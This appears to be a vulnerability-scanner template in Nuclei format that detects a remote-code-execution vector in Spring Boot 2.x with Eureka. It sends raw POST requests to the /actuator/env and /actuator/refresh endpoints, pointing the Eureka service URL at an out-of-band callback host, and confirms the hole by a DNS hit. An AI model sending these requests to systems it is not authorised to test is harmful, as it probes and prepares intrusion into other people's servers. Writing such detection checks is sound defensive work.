id: springboot2.x_eureka_rce
info:
  name: springboot2.x eureka rce
  author: yueji0j1anke
  severity: high
  description: ''
  reference: []
  classification:
    cvss-metrics: ''
    cvss-score: 0.0
    cve-id: ''
    cwe-id: ''
  tags: ''


requests:
- raw:
    - |
      POST /actuator/env HTTP/1.1
      Content-Type: application/x-www-form-urlencoded

      eureka.client.serviceUrl.defaultZone=http://{{interactsh-url}}
    
    - |
      POST /actuator/refresh HTTP/1.1
      Content-Type: application/x-www-form-urlencoded

      aaa
        

  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: interactsh_protocol
    words:
    - "dns"